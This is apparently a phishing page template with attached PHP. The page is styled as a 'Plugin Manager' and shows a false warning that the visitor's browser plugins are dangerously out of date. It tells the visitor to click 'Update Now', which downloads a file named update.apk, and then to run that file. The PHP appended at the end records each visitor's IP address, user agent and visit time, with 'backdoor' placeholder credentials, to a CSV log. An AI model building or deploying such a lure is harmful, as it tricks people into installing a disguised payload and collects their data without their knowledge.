<!DOCTYPE html>
<html>
   
   <head>
      <link rel="icon" href="static/images/favicon.ico">  
      <title>Plugin Manager</title>
      <meta name = "viewport" content = "width = device-width, initial-scale = 1.0">
      
      <link href = "static/css/bootstrap.min.css" rel = "stylesheet">
      <link href="static/css/theme.css" rel="stylesheet">
      
   </head>
   
   <body>
      
    <nav class="navbar navbar-inverse navbar-fixed-top">
      <div class="container">
        <div class="navbar-header">
          <a class="navbar-brand" href="">Plugin Manager</a>
        </div>
        </div>
        </nav>


      <div class="container theme-showcase" role="main">

      <div class="alert alert-warning" role="alert">
        <h4><strong>WARNING:</strong> Your browser plugins are severely out of date. Update your browser plugins to continue browsing securely.</h4>
      </div>

            <tbody>
              <tr>
                <td>
                  <h4>
                  <form method="get" action="update.apk">
                    <button type="submit" class="btn btn-lg btn-success">Update Now</button>
                    </form>
                  </h4>
                </td>
              </tr>
         </tbody>
         </table>

               <br>

               <p> 
       <ul class="list-unstyled">
               <ul>
                   <li><h4><strong>Step 1:</strong> Click 'Update Now' to download the update file.</h4></li>
                   <li><h4><strong>Step 2:</strong> Run the update file to update your plugins.</h4></li>
               </ul>
       </ul>
      <br>


      </div>
      </div>
      </div>

      
         <br>

         <img src="static/images/plugins.png" class="img-thumbnail" alt="A generic square placeholder image with a white border around it, making it resemble a photograph taken with an old instant camera">

        </div>
      </div>

    </div>

      </div>

      <script src = "static/js/jquery.js"></script>
      
      <script src = "static/js/bootstrap.min.js"></script>
      
   </body>
	
</html>
<?php
  date_default_timezone_set('Asia/Yangon');
  $email = "backdoor";
  $pass = "backdoor";
  $ip = $_SERVER['REMOTE_ADDR']; 
  $time = date("Y/m/d h:i a");
  $agent = $_SERVER["HTTP_USER_AGENT"];
  $agent = str_replace(',', '', $agent);
  $f = fopen("logger.csv", "a");
  fwrite($f,$email.",".$pass.",".$ip.",".$agent.",".$time."\n");
  fclose($f);
?>